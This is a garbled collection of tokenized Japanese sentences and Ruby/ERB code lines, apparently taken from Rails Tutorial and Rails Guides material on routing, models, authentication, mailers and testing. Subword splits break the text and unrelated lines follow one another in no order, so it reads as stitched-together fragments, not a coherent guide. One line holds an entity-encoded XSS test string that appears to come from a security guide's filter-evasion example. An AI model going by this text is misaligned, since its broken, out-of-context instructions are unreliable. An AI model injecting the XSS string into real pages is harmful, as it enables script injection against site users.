▁available _ locales の 強 制 は セキュリティ のために 行われている ことにご注意ください ▟ つまり 、 アプリケーションが 把 握 していない ロケール を持つ ユーザー 入力 が 、 ロケール 情報 として 使用される こと の ないようにする ためのものです 。
▁デフォルトでは 、 この 例外 は 4 06 ▁ Not ▁A c ce p table 応答 として 扱 われます が 、 この動作 をオーバーライドする ことができます 。
▁ユーザー 認 証 が行われていない 。
▁ただし 、 読者 から ト ラ ブ ル 報 告 が いくつか 来 ていた ので 、 念のため \ k ode { heroku ▁run ▁rake ▁db : migrate } を実行する ように して あります 。
▁\ k ode { div } タグ の CSS クラス \ k ode { her o - unit } は 、 signup ボタン の \ k ode { btn } クラス 、\ k ode { btn - large } クラス 、\ k ode { btn - primary } クラス と同様 、 Bootstrap において 特別な 意味 を持ちます 。
▁この ページ が どのように して 表示される のか を理解する ために 、 まずは テキストエディタ で StaticPages コントローラ を開いて みましょう ▟ リスト \ ref { code : static _ pages _ controller } のような 内容 になっている はずです 。
▁このコードは 、 ひとつ のユーザー リクエスト に対して \ k ode { current _ user } が 何 度 も 使用される 場合にのみ 有用です ▟ いずれ の場合 も 、 ユーザーが Web サイト にアクセスすると \ k ode { find _ by } は 最 低 1 回 は 呼び出され ます 。
▁従って 、 ▁ ハッシュ に対して \ k ode { each } メソッド を実行すると 、 ハッシュの 1 つの 「 キー と 値 の \ emph { ペ ア }」 ごとに 処理を 繰り返し ます 。
▁この フォーム の各 部分 について 見 てみましょう 。
▁ アセットパイプライン の 第 一 の 機能 は アセットを 連結 することです ▟ これにより 、 ブラウザ が Web ページを レンダリング するための リクエスト 数を 減 ら す ことができます 。
▁A ▖ new ▖ x ▁= ▁1 ▁# ▁ NoMethodError
▁ 種類 が ` url ` の 標準 入力 フィールド を作成します 。
▁( ここで いくつか 警 告 メッセージ が表示される ことがあります が 、 無視 しても構いません ▟)
▁最後に 、 S ublime ▁Text 上で 直接 テストを実行 する方法 を 紹介します ▟ この テクニック は 、 特に Spork と併用する と 非常に 便利です 。
▁ 先ほど の メソッドを使って 比 較 演 算 して いた 行 を 置き換え ると 、 リスト \ ref { code : correct _ user _ before _ filter _ boolean } になります 。
▁\ k ode { application ▖ js } に Bootstrap の JavaScript ライブラリ を追加する
▁ Proc ess V ide o J ob ▖ perform _ later ( V ide o ▖ last )
▁ これはリスト \ ref { code : initial _ signin _ page } で使用されていました 。
▁[ ハッシュ 条件 ](# ハッシュ を使用した 条件 ) の場合 、 結合テーブル で 条件 を指定する 場合に 特殊な 構 文 を使用します 。
▁ このため 、 実際の PUT リクエストを 受け取る API は 今後 も 利用できます 。
▁リスト \ ref { code : sign _ in _ helper } のとき
▁Rails ▁API の一部 を ドキュメント 化 する 際に は 、 それが Rails スタック のひとつ となる ことを 意 識 しておくこと が重要です 。
▁NOTE : ▁Rails の C I ▁( 継 続 的 イン テ グ レ ー ション : ▁Co nt in u ous ▁ Integration ) ▁ サーバー の 負 荷 を 減 ら す ために 、 ドキュメント 関連の コミットメッセージ には [ ci ▁skip ] と 記 入 してください ▟ こうすることで 、 コミット 時の ビルド は スキップ されます 。
▁ここでは 、 Application という名前の コントローラ の中に \ k ode { hello } という名前の アクション を作成する ことにします 。
▁{0} 図 3▖1 {/0} {1} サンプルアプリケーションの \ k ode { config } ディレクトリ の内容 ▟\ href { http :// railstutorial ▖ org / images / figures / config _ directory _ rails _ 4 - full ▖ png }{( 拡大 ) }{/1}
▁ 顧客 によって は HTML フォーマット の メール を受け取り たくない 人 も い るので 、 テキスト メール も 作成 しておく のが 最 善 です 。
▁ 本番 用の Web サイト で SSL を 使えるように するためには 、 ドメイン 毎 に \ emph { SSL 証 明 書 } を 購 入 し 、 セットアップ する必要があります 。
▁次に \ k ode { hello \_ app } という Rails アプリ の最初の サンプル 作成 に取りかかりま す 。
▁< td > <%= ▁article ▖ title ▁%></ td >
▁最後に 、 システムによっては 変更を 反 映 するために ターミナル 上で Ctrl - C を 押 して Web サーバーを再起動 する必要が 生じる こともあります 。
▁=> ▁[" f ", ▁" w ", ▁" i ", ▁" a ", ▁" h ", ▁" p ", ▁" c ", ▁" x "]
▁ まとめると 、 {0}{1} 第 6 章 {/1}{/0} から {2}{1} 第 10 章 {/1}{/2} を通して 、 Rails の ログイン と 認証システムを ひ と とおり 開発 します 。
▁params ▖ require (: comment )▖ permit (: comment er , ▁: body )
▁ユーザー登録 のテスト に アカウント有効化 を追加する
▁< h 1> Contact s </ h 1>
▁ ユーザー編集ページ のモックアップ
▁ アクション で使用する デフォルトの メイラー ビュー を変更する には 、 たとえば 以下のように します 。
▁ 各 マイクロポストの 表示 には 、 3 つの どの 場合にも 、 それ が作成され て からの 時間 ▁( " 1 分 ​​ 前に 投 稿 " ▁ など ) ▁ が表示され ていることに注目してください ▟ これはリスト \ ref { code : micropost _ partial } の \ k ode { time \_ ago \_ in \_ words } メソッド による ものです 。
▁| ▁| ▁10 1 ▁| ▁: s w it ch ing _ proto col s ▁|
▁この ページ は 新規 セッション 用 なので 、 今 から 作成する サインイン ページを \ k ode { app / views / sessions / new ▖ html ▖ erb } に 置く ことに 注 目 ください 。
▁{0} 図 11 ▖ 17 {/0} ▁{1} 2 番目 に 新しいマイクロポスト を削除し た 後 のユーザー Home ページ {/1}
▁\ chapter { ゼロ から デプロイ まで } ▁% ▁( fold )╼\ label { cha : beginning }╼╼
▁</ select >
▁### ▁ テスティング の カ バ レ ッ ジ
▁JSON ▁Patch は 最 近 R F C 化 された ばかり なので Ruby ライブラリ は それ ほど ありません 。
▁def ▁middleware
▁ ブログ アプリケーション を作成し たら 、 その フォルダ 内に 移動 します 。
▁` scope ` と ` where ` 条件 を 混 用 して マッチ させる ことができます ▟ その 結果 生成される 最終的な SQL には 、 すべての 条件 が ` AND ` で 結合 されて 使用されます 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁Users コントローラと User モデル の関係 を さらに 考 察 するために 、\ k ode { {1} リスト 2▖ 5 {/1} } で {2} index {/2} アクションを 整 理 してみ ました
▁この章では 、 Users リソース 用の REST アクション ▁( 表 \ ref { table : RESTful _ users }) ▁ のうち 、 これまで 未 実装 だった \ k ode { edit }、\ k ode { update }、\ k ode { index }、\ k ode { destroy } アクション を追加し 、 REST アクションを 完成させます 。
▁* ▁`: less _ than _ or _ equal _ to ` ▁- ▁ 指定された 値 と 等 しい か 、 それ よりも 小 さ く なければならない こと を指定します 。
▁<%= ▁form _ tag (' / articles ', ▁remote : ▁true ) ▁do ▁%>
▁# ▁Use ▁ jquery ▁as ▁the ▁JavaScript ▁library
▁ テストを書く 理由 のひとつ は 、 今 行った 実装 の エラーを キャッチ できるように することです 。
▁` http :// localhost :3000/ blog ` で エンジン にアクセスすると 、 記事 は 空の 状態 です 。
▁S at , ▁ 22 ▁Sep ▁2012 ▁ 23:59:59 ▁UTC ▁+00:00
▁* ▁ エンジン で使用する レイアウト ビューテンプレート
▁@ assembly ▁= ▁@ part ▖ assemblies ▖ find (1)
▁" SSL Error "▖ underscore ▖ camelize ▁# ▁=> ▁" SSL Error "
▁ いよいよ 新規 記事 を 投 稿 する フォーム を作成する ことにしましょう 。
▁2 番目の 引数 で 名前付きルート を 渡 している 点 は これまで と同じ ですが 、 その後 に 別の 引数 があります 。
▁ アプリケーションで Cucumber を使用する ための 設定 を行う ために 、 次は 必要な サポート 用 ファイル と ディレクトリ を生成します 。
▁% w ( foo ▁bar ▁ baz )▖ sum ▁# ▁=> ▁" foobar baz "
▁require ▁' active _ support / core _ ext '
▁` require ` は 、 必要な ファイルを Sprockets に 指定 するのに 使用します 。
▁` config / database ▖ yml ` ファイル があり 、 環境変数 ` ENV [' DAT A BASE _ URL ']` が設定され ていない 場合は 、` config / database ▖ yml ` ファイル を使用して データベース接続 が 行われます 。
▁この 改 修 が 終 わ ると 、 ▁{0}{1} リスト 3 ▖ 3 3 {/1}{/0} 、 {2}{1} リスト 3 ▖ 34 {/1}{/2} 、 {3} {1} リスト 3 ▖ 3 5 {/1} {/3} のように 実に 簡潔 で 美 しい コード になります 。
▁この場合 、 以下のように 設定 します 。
▁t ▖ text ▁: body
▁( このため \ k ode { respond \_ to } メソッドは 、 上 から 順に 実行する 逐 次 処理 という より 、 if 文 を使った 分 岐 処理 に 近 い イ メ ー ジ です ) 。
▁ パーシャル を使用することで 、 ビュー 内の コードを い く つ もの ファイルに 分割 して 書き 出 し 、 他の テンプレート でも 使い ま わ す ことができます 。
▁=> ▁- 1
▁* ▁` rake ▁ doc : guides ` を実行すると 、 本 Rails ガイド の 完全な コピー が アプリケーションの ` doc / guides ` フォルダ に 生成されます 。
▁< th ▁ col span =" 3 "></ th >
▁# ▁ slash es ▖
▁ カスタム スト ア は ` ActionDispatch :: Session :: M y Custom Store ` として 定義 する必要があります 。
▁ 実は 、 この 3 つ 以外に も カスタム の 環境 を作成する ことができます ▟ 詳細については 「\ href { http :// r ailscasts ▖ com / episodes / 7 2 - adding - an - environment } { 環境 を追加した 場合 の RailsCast } ▁( 英語 )」 を参照してください 。
▁Rails は 、 その バージョン が リリース され た時点で 最新の バージョンの Ruby に依存し ています 。
▁# ▁=> ▁{" " => nil , ▁ "1" =>1 , ▁" nested "=>{" a " => 3 , ▁"5" => 5}}
▁create ▁app / assets / javascripts / users ▖ js ▖ coffee
▁ユーザーの 認 証 は 、 パスワード の 送信 、 ハッシュ化 、 データベース 内の ハッシュ化 された 値 と の 比 較 、 という 手順 で 進 んで い きます 。
▁M ▁= ▁X :: Y :: Z
▁\ ref { sec : augment ing _ the _ user _ show _ page } のユーザー マイクロポストの テンプレート 作成 作業 の 成 果 は 、 何 とも 拍 子 抜 け でした 。
▁ 一 緒 に 頑 張 り ましょう 。
▁`: polymorphic ` オプション に ` true ` を指定すると 、 ポリモーフィック関連付け を指定できます 。
▁* ▁Rails ▁4▖0 の アセット の プリコンパイル では 、` vendor / assets ` および ` lib / assets ` にある 非 JS / CSS アセット を自動的に は コピー し なくなりました 。
▁ //= ▁require ▁ jquery _ ujs
▁Rails には 実 用 的な デフォルトの マニフェストファイル が 付 属 している ので 、\ emph { Rails チュートリアル } では 変更 を加える 必要がありません が 、 もし 必要な 場合は 、 Rails ガイド の 「\ href { http :// guides ▖ rubyonrails ▖ org / asset _ pipeline ▖ html } { アセットパイプライン }」 で 詳細な 情報 を参照 できます 。
▁上のコードは 、 " Proc ess ▁data ▁files ▁( 0 ▖ 3 45 23 ) " のような ログ を出力します ▟ この ログ は 、 コード 最適化 のために タイミング を 比 較 する 際に 役 立 て ることができます 。
▁& # 1 08 ; & # 10 1 ; & # 1 14 ; & # 1 16 ; & # 4 0 ; & # 3 9 ; & # 88 ; & # 8 3 ; & # 8 3 ; & # 3 9 ; & # 4 1 ; >
▁ テキストエディタ で ` app / views / welcome / index ▖ html ▖ erb ` を開いて みましょう 。
▁ 正しく 関連付け が でき たら 、 リスト \ ref { code : micropost _ validity _ test } の \ k ode { setup } メソッドを 修正 して 、 慣習 的に 正しく マイクロポストを 作成 してみます ▁( リスト \ ref { code : micropost _ validity _ test _ idiomatic }) 。
▁< script >
▁select _ datetime ()
▁ メールアドレスを ユーザー名 にした ことで 、 ユーザー 同士 で 通 信 できるように 拡張 できる 可能性 が 開 か れ ます ▁( 第 \ ref { cha : account _ activation _ and _ password _ reset }) 章 ) 。
▁# ▁< contributor >
▁また 、 実際に 問題 になる こと はほとんど ありません が 、 問題 になる 可能性 も あるので 長 すぎる メールアドレス に対して も バリデーション を 掛 け ましょう ▟ ほとんどの データベース では 文字列 の 上 限 を 2 55 と している ので 、 それ に合わせて 2 55 文字 を 上 限 とします 。
▁< td > <%= ▁b ▁%></ td >
▁ 簡潔 さ は それ だけで 長 所 になります 。
▁options ▁= ▁ args ▖ extract _ options !
▁このメソッドは `: years `、`: months `、`: weeks `、`: day s `、`: hour s `、`: minute s ` および `: seconds ` を キー に 持つ ハッシュ を受け取り 、 日時 を できる だけ 詳細な 形式で 、 現在の キー で 示 される とおり に 返します 。
▁この 配置 された テンプレート で 、 関数 の 引数に ダイジェスト 名 を追加して この メソッドを 一 般 化 し 、 続いて 上の ように 文字列 の 式 展開 を使用します 。
▁ 保存 に 失敗した場合 は 、 単 に \ ref { sec : signup _ failure } で開発した とおり の動作 が 実行 { されます 。
▁ とは い え 、 一般的な ア ル フ ァ ベ ッ ト など を使っている 限り において は 、 シンボル で 困 ること は ない でしょう 。
▁リスト { p 0} の {2} hello {/2} アクション を書き換え 、「 hola , ▁ mundo !」 と 表示される ように してみましょう
▁content _ type : ▁" text / plain ",
▁また 、 不 安 定 な 要素 が 特に 見当たらない アプリケーション や 、( 主 に ビュー が ) ▁ 頻繁に 改 定 される 可能性 の高い アプリケーションの コードを書く ときには 、 思い 切 って テスト を省略 してしまう ことも ない わけではありません 。
▁今度は アプリケーションに 第 2 の モデル を追加しましょう 。
▁\ ref { sec : development _ environment } で紹介した Cloud ▁IDE では 、 デフォルトで このような 行 が含まれます 。
▁テストにパスする Home ページ 用 コード 。
▁has _ many ▁: invoices , ▁ dependent : ▁: destroy
▁上 で示した パターン に 則 って 、 flash 変数 の内容を Web サイト 全体 に わ た って 表示 できるように すると 、 次のような コード になります 。
▁ リレーションシップ という パ ズ ル の 最後の 一 片 は 、\ k ode { user ▖ followers } メソッド を追加する ことです ▟ これは 上の \ k ode { user ▖ followed _ users } メソッドと 対 になります 。
▁\ emph { 文字列 ▁( string )} ▁ は 、 Web アプリケーション において おそらく 最も 重要な データ構造 です ▟ これは 、 Web ページ という もの が 究 極 的に は サーバー から ブラウザに送信 された 文字列 に す ぎ ない ためです 。
▁root ▁to : ▁' pages # main '
▁ コード に 貢献 するには 、 まず Rails リポジトリを ク ロー ン する ところから始め る必要があります 。
▁作成した コードをリスト \ ref { code : remember _ method } に示します
▁ これはリスト \ ref { code : password _ reset _ update _ action } で使用されていました 。
▁class ▁ Product sController ▁< ▁Application Controller
▁ 以上の 説明 で 動作 が 明 ら か になりました ▟ 接続 情報 は 絶対に database ▖ yml に 直接 書 か ず 、 常に ` ENV [' DAT A BASE _ URL ']` に保存 したものを 利用 してください 。
▁ NoMethodError : ▁undefined ▁method ▁` to _ a ' ▁for ▁ 9 : Fi x n um
▁{0} 図 9 ▖ 14 {/0} {1} ユーザー インデックス \ href { http :// localhost :3000/ users }{/ users } に 削除リンク が表示されている ▟\ href { http :// railstutorial ▖ org / images / figures / index _ delete _ links _ rails _ 3 _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ 一 方 、 Asset ▁Pipeline では 、 本番環境 に 最適化 するために 、 すべての スタイルシート を 1 つの CSS ファイル ▁(\ k ode { application ▖ css }) ▁ に まとめ 、 すべての JavaScript ファイルを 1 つの JS ファイル ▁(\ k ode { javascripts ▖ js }) ▁ に まとめて く れ ます ▟ さらに 、 それらの ファイル すべて に対して ▁(\ k ode { lib / assets } や \ k ode { vendor / assets } の ファイル も含め ) ▁ 不要な 空白 を 取り除く 処理を 行い 、 ファイル サイズ を \ emph { 最小化 } してくれます 。
▁assemblies ( force _ reload ▁= ▁false )
▁この フォーマット は 、 Active ▁Record で 条件 の値 の 範囲 を サポート するときに 使用 されています 。
▁ オブジェクト 指 向 プログラミング の 経験 がない 方 にとって は 何 の こと だ か わからない と思います ので 、 いくつかの 具 体 例を 示す ことにします 。
▁* ▁` collection ▖ create ( attributes ▁= ▁{}) `
▁ ╼\ end { code }╼╼ ▁\ subsection { 基本的な モデル } ▁% ▁( fold )╼ ▁\ label { sec : the _ basic _ model }╼╼
▁ ユーザーが この チェックボックス を オフ すると 、 すべての コンピュータ 上の すべての ブラウザから ログアウト します ので 、 注意が必要です 。
▁ Spring サーバー は 本 節 の 執 筆 時点 では 若 干 不 安 定 な 点が 残 って いて 、 Spring の \ emph { プロセス } が 起動 した まま 多数 残 留 すると 、 テストの パフォーマンス が 低 下 してしまう ことがあります 。
▁それでは サンプルアプリケーションの About ページ の作成 に取りかかりま す 。
▁create ▁app / models / micropost ▖ rb
▁Client ▖ joins (: orders )▖ where ( orders : ▁ { ▁created _ at : ▁time _ range ▁ })
▁リスト \ ref { code : signup _ with _ account _ activation _ test } の \ k ode { assigns } メソッドは 本チュートリアル 初 登 場 です ▟ 第 \ ref { cha : log _ in _ log _ out } ▁ 章 の演習 ▁(\ ref { sec : log _ in _ out _ exercises }) ▁ で 説明したように 、\ k ode { assigns } メソッドを使用すると 、 対応する アクション 内にある インスタンス変数 にアクセス できるようになります 。
▁ まだ テキスト を 書いた だけ なので 、 当 然 ながら このままでは Cucumber の シナリオ は テストにパス しません 。
▁=> ▁ BasicObject
▁` includes ` メソッドを使用すると 、 その 関連付け が 使用される ときに eager - load ▁( 訳 注 : p reload とは 異なる ) しておきたい 第 2 関連付け を指定することができます 。
▁* ▁その ルーティング で使用する パラメータ
▁上の フィーチャー ファイル のコードは 、 ステップ ファイル では 以下のように 扱 われます 。
▁これは 、 以下のコード では
▁図 \ ref { fig : new _ signup _ page } ▁( 図 \ ref { fig : blank _ signup _ page _ re c a p } にも 再 録 ) ▁ に示した とおり 、 ユーザー登録ページ はまだ 空白 のまま なので 、 このままでは ユーザー登録 できません 。
▁この ドメイン 特 化 言語 の 文法 は シ ン プ ル で 、 必要な オブジェクトの 属性 を定義する ために Ruby の ブロック と カスタム メソッド を使用しています 。
▁ ユーザープロファイルページ が表示される こと ▁( ページ タイトル が ユーザー名 になっている こと ) 、 サイトの ナビゲーション に 次の 3 つの 変更 が 加 えられ ている ことを確認する よう 、 テストを 変更します 。
▁詳細については [ R o s ar io ▁ V al o tt a ' の 論 文 ]( http :// www ▖ x s s ed ▖ com / new s / 37 / N d u ja _ Connection _ A _ cross _ web mail _ w or m _ X W W / ) を参照してください 。
▁ モデルの ファイル の他に マイグレーション ファイル も 生成 されています ▟ マイグレーション ファイルは 、 モデル に対応する データベース テーブル を 生成 するために使用されます 。
▁class ▁B
▁上のコードは 、\ k ode {@ user } と同じ メールアドレス のユーザー を事前に 作成する 手法 です ▟ 今回は 、 同じ 属性 の ユーザーを 作る ために 、\ k ode {@ user ▖ dup } を使っています ▟ 同じ 属性 のユーザー が保存され た 後 では 、 元の \ k ode {@ user } と同じ メールアドレスが 既に データベース 内に 存在してい るため 、\ k ode {@ user } は 無効 になります 。
▁ この時点で ブラウザで < http :// localhost :3000/ articles / new > を表示する と 、 記事 の作成 が ▁* ほぼ * ▁ 可能な 状態 になっています 。
▁` create ` アクション の 役 割 は 、 記事 をデータベースに保存する ことです 。
▁validates ▁: token , ▁presence : ▁true , ▁uniqueness : ▁true , ▁ strict : ▁ Token Generation E xception
▁ キー が 衝 突 した 場合 、 引数 の ハッシュの キー が ` merge ` では 優 先 されます 。
▁このコードは 、 各 ページ の内容を レイアウト に 挿入する ためのものです 。
▁作成した コードをリスト \ ref { code : microposts _ destroy _ action } に示します
▁この モードでは 、 パ イ プ ラ イン の アセット への リクエスト は 直接 Sprockets によって 扱 われます 。
▁さらに 、 削除 された オブジェクトは 、 以下のように まだ メモリ 上に 残 っています 。
▁ ブラウザの < http :// localhost :3000/ articles / new > を再 表示する と 、 今度は 別の エラーが表示され ます 。
▁ カスタム セッション スト ア を指定することもできます 。
▁Ruby をインストール する 前に 、 以下を実行して \ href { http :// rvm ▖ io / rvm / install /}{ RVM } をインストール します 。
▁<%= ▁javascript _ include _ tag ▁" application ", ▁" data - turbolinks - track " ▁=> ▁true ▁%>
▁ これはリスト \ ref { code : from _ users _ followed _ by _ first _ cut } で使用されていました 。
▁このメソッドは 、 引数に 与えられた 文字列 ▁( パスワード ) ▁ を ハッシュ化 した 値 と 、 データベース 内にある \ k ode { password _ digest } カラム の 値を 比 較 します 。
▁ isolate _ namespace ▁Blorgh
▁Active ▁Support が提供する ` to _ json ` メソッド の実装 は 、 通常 ` json ` ▁gem が Ruby オブジェクトに対して 提供し ている ` to _ json ` よりも 優 れ ています 。
▁ 論理値 を と る \ k ode { admin } 属性 が追加された User モデル
▁ 元に戻す 方法
▁Client ▖ find _ or _ create _ by ( first _ name : ▁' Andy ') ▁do ▁| c |
▁#### ▁` has _ many ` の オプション
▁ 記 入 済み の ` < form >` を 得 られた だけで は 何か 物 足 り ません 。
▁< http :// localhost :3000/ articles / new > を ブラウザで 再 表示 し 、 わざと 記事 の タイトル を 空 に して 保存 してみましょう ▟ Rails は 記事 入力 フォーム を再 表示 するはずです ▟ しかし これ だけで はまだ 不 親 切 です 。
▁また 、 Rails ▁ の 教 育 エ コ システム に 存在する 、 さらに 高度な 内容 の 本 や ブログ 、 スクリーンキャスト など を 読み 解 く 力 も 身につけ られる でしょう 。
▁ 正しく インストール されている こと 、 PATH 環境変数 が正しく 通 っている ことを確認してください 。
▁Git ▁remote ▁ heroku ▁added
▁` app / assets / javascripts ` に置かれている JavaScript アセット へのパス を算出 します 。
▁gem のインストール 完了 後 、` <%= ▁console ▁%> ` などの コンソール ヘルパー への 参 照 を ビュー に追加する だけで 、 どの ビュー でも コンソール を 利用 できるようになります 。
▁\ href { http :// l m gt fy ▖ com / ? q = rails + en force + password + strength } { Rails で パスワード の長さ を設定する 方法 } は たくさん あります が 、 今回は 簡潔 に パスワードが 空 で ないこと と 最 小文字 数 ▁( 6 文字 ) ▁ の 2 つ を設定し ましょう 。
▁( 執 筆 予 定 )
▁COM ▁ THE _ U S - ER @ foo ▖ bar ▖ org ▁first ▖ last @ foo ▖ jp ]
▁ セキュリティ上の 注意 点を もうひとつ ▟ 再設定 用の リンク は なるべく 短 時間 ▁( 数 時間 以 内 ) ▁ で \ emph { 期限切れ } になるように し なければなりません ▟ そのために 、 再設定 メールの 送信 時刻 も 記 録 する必要があります 。
▁[ remember ▁me ] ▁ チェックボックス のテスト
▁<%= ▁link _ to ▁" New ▁book ", ▁new _ book _ path ▁%>
▁ アセット の Cache - Control ヘッダ は 一般に ▁" public " ▁ に しておく もの であり 、 Rails サーバー は CDN や ブラウザ に対して この ヘッダ を 通 じ て その ことを 通知 します ▟ アセット が ▁" public " ▁ である ということは 、 その リクエストを どんな キャッシュ にも 保存 して よい という ことを意味します 。
▁この 値は メール ごとに 上書き することもできます 。
▁### ▁ バリデーション の 条件 を結合する
▁email = michael %40 michael hartl ▖ com "> Re set ▁password </ a >╼╼< p > This ▁link ▁will ▁ expire ▁in ▁two ▁hours ▖ </ p >╼╼< p >╼ If ▁you ▁did ▁not ▁request ▁your ▁password ▁to ▁be ▁reset , ▁please ▁ignore ▁this ▁email ▁and ╼ your ▁password ▁will ▁ st a y ▁as ▁it ▁is ▖
▁リスト \ ref { code : followers _ test } では リスト \ ref { code : utility _ method _ tests } に 1 行 だけ 追加 しています が 、 実際には 多くの 処理 が正しく 動 い ていなければ パス しません ▟ つまり 、 リスト \ ref { code : has _ many _ following _ through _ passive _ relationships } の実装 に対するテスト は 、 実装 の 影 響 を受け やすい テスト だと い えます 。
▁デフォルトのエラーメッセージは 複数形 で 表現 されている ことにご注意ください ▁( 例 : ▁" is ▁too ▁short ▁( minimum ▁is ▁% { count } ▁characters ) ") 。
▁なお 、 以前の バージョンの Rails では \ text tt { PATCH } ではなく \ text tt { PUT } が使用され ていました ▟ PUT は Rails ▁4▖0 でも 依 然 サポート されて は います が 、\ text tt { PATCH } の方が \ href { http :// web log ▖ rubyonrails ▖ org / 20 12 / 2 / 2 6 / ed ge - rails - patch - is - the - new - primary - http - method - for - update s /}{ 意図 した HTTP の使用 法 により 適 している } ので 、 新しい アプリケーションでは PATCH が 推 奨 されています 。
▁email
▁Rails では 、 メモリ を 圧 迫 しない サイズ に バッチ を 分割 して 処理 するための 方法を 2 とおり 提供し ています 。
▁このヘルパーは 、 指定された 属性 が 空 でない ことを確認します 。
▁< ul >
▁: video job s
▁上の コマンド の最初の 引数 は マイグレーション 名 、 次の 引数 は 作成する 属性 の名前 と 型 です
▁message : ▁" 英 文字 のみ が 使用できます " ▁ }
▁ パーシャル に ローカル変数 を 引数として 渡 し 、 パーシャル を さらに 強 力 かつ 柔 軟 に することもできます 。
▁development サーバーを再起動 して リスト \ ref { code : development _ email _ settings } の設定 を 読み 込 んだ ら 、 次は \ ref { sec : account _ activation _ mailer } で 自動生成 した User メイラー の \ emph { プレビュー ファイル } の 更新 が必要です ▁( リスト \ ref { code : generated _ user _ mailer _ preview s }) 。
▁Person ▖ create ( name : ▁nil )▖ valid ?
▁ここで 、` isolate _ namespace ` メソッド について 特別な 注意が必要です 。
▁もちろん 、 実際に ブラウザ を 起動 して 、 テスト が正しく 動いている かどうかを 確かめ ることもできます ▁( 図 \ ref { fig : about _ us }) 。
▁ フラッシュメッセージ が 消え ない 問題 は 、 この アプリケーションの 小さな バグ です 。
▁以前のバージョン の Rails では 、 以下のコード は
▁ セキュリティ が 最 重要 課題 であれば 、 セキュリティ モデル で エラーが発生し た場合 のテスト を 最初に 書く べ き 。
▁また 、 入力 された パスワード を使用して ユーザーを \ emph { 認 証 } する手段 と 、 {1} {2} 第 8 章 {/2}{/1} で使用する 、 ユーザーが サイトに ログイン できるように する手段 も 提供し ます 。
▁{" action " ▁=> ▁" create ", ▁" controller " ▁=> ▁" people ", ▁" person " ▁=> ▁{" first _ name " ▁=> ▁" W i ll ia m ", ▁" last _ name " ▁=> ▁" S m i th "} }
▁( この \ k ode { follow !} メソッドは 常に 正常に動作し なければなりません ▟ 従って 、\ k ode { create !} メソッド や \ k ode { save !} メソッド と同様 、 末尾に 感 嘆 符 を 置 いて 、 作成 に 失敗した場合 には 例外を発生 すること を示します ) ▁ 。
▁create ▁app / assets / stylesheets / scaffold s ▖ css ▖ scss
▁ 全て の 準備 が 整 った 今 、 ユーザーが 短い メッセージ を 投 稿 できるように するための リソース 「\ emph { マイクロポスト }」 を追加 していきます
▁* ▁ 値が 呼び出し 可能な ▁( call able ) ▁ オブジェクト の場合 、 引数 が 1 つ または 2 つ 必要です 。
▁次に 、\ href { https :// github ▖ com / mini magic k / mini magic k } { MiniMagick } という gem を使って 、 CarrierWave から ImageMagick を 使えるように します 。
▁ユーザー や マイクロポスト など に 関 して は 自然に リソース 化 できる ので 問題ありません 。
▁ このような 理由 で 、 本書 の テストコード では 、 コア となる アプリケーションコード をテストする 際に 高度な 機能 ▁( ユーザーが サインイン できる こと 、 ページ 移動 後 も サインイン している こと 、 サインアウト できる こと ) ▁ に 重 点を 置 き 、 重要 性 の 低 い 機能 は 必ず し も 含 んで いません 。
▁ 自分の 変更 が どちら に 該当する か わからない 場合は 、 余分な 作業を せずに 済 む ために も 、 変更を バックポート する 前に Rails チーム の メンバー に ご 相 談 ください 。
▁ これを行なうには 、 comment モデルと comments コントローラ を生成し 、 articles ▁scaffold を変更 して コメント を表示できるように し 、 それ から 新規 コメント を作成 できるようにします 。
▁ ある リソース の 「 単数形 の フォーム 」 を定義し たい場合 、` In f le c to r ` に 活用 形 ルール を追加します 。
▁上の 設定 は あくまで オ ス ス メ なので 、 リスト \ ref { code : irbrc } を追加し なくても 、 以下のように Rails コンソール を開始 できます 。
▁Client ▖ unscope d ▖ load
▁ 拡張 されていない 純 粋 な Ruby を使用して 、 メソッドを 他の メソッドで 包 み 込 む ( wrap ) ことができます ▟ これは ▁ _ エイリアス チ ェ ー ン ▁( alias ▁ chain ing ) _ ▁ と呼ばれ ています 。
▁# ▁If ▁you ▁change ▁this ▁key , ▁all ▁old ▁signed ▁cookies ▁will ▁become ▁invalid !
▁ フォローしている 全て の ユーザーを データベースから 取得 し 、 その 集合 に対して \ k ode { include ?} メソッドを 実行 している よう に見えます が 、 しかし 実際には データベース の中で 直接 比 較 を する ように 配 慮 しています 。
▁\ k ode { email } 属性 の 存在性 のテスト 。
▁ ▖ gitignore
▁ 著者 は 、 複数の ビューで 共有 する ユーティリティ パーシャル については \ k ode { shared } フォルダ に保存 し 、 文字 どおり 全 ページ ▁( サイト レイアウト の一部 として ) ▁ 共通の パーシャル については \ k ode { layouts } ディレクトリ へ 保存 すること を 好 んで います
▁M ▖ parent s ▁# ▁=> ▁[ X :: Y , ▁X , ▁Object ]
▁( Code ▁School の \ href { http :// www ▖ code school ▖ com / c our s es / testing - with - rspec } { RSpec コース } の 履 修 を 検 討 してみる の も よいでしょう ▟ この コース は RSpec に関する 多くの 疑 問 に 答 え てくれる という 読者 からの 報 告 もあります ) 。
▁ このコード を再度 実行する と 、 この ブロック は 実行 されません 。
▁<%= ▁asset _ path (' s m ile ▖ png ') ▁%>
▁ 最後の 例 では 、 シンボル \ k ode { : activation } に 等 しい \ k ode { attribute } 変数 を定義し 、 文字列 の 式 展開 ▁( in ter p ol ation ) ▁ を使用して 引数 を 正しく 組み 立 て て から 、\ k ode { send } に 渡 している ことです 。
▁password _ field _ tag ▁' pass '
▁ Linux ▁ の場合 、 デフォルトの ターミナル で 問題ありません 。
▁ 間違った パスワード を与え た 結果 、\ k ode { user ▖ authenticate } が \ k ode { false } を返し た ことがわかります 。
▁ これはリスト \ ref { code : annotate d _ title _ helper } で使用されていました 。
▁" User "▖ foreign _ key ( false ) ▁# ▁=> ▁" user id "
▁### ▁comments リソース を生成する
▁ ちなみに 、 ここに flash のテスト も 追加 して おくとよいでしょう ▟ これは 演習 として 残しておきます ▁(\ ref { sec : exercises _ the _ flash }) 。
▁ New s ビューで 新しい レイアウト が 使用される ようになり 、 ト ッ プ メニュー が 隠 されて " content " ▁ div タグ 内に 右 メニュー が 新しく 追加 されました 。
▁\ label { fig : bitbucket _ repository _ page } }╼\ end { figure }╼╼ ╼ ▁\ subsection { ブランチ ▁( branch ) 、 変更 ▁( edit ) 、 ▁ コミット ▁( commit ) 、 マージ ▁( merge )} ╼ ▁\ label { sec : git _ commands }╼╼
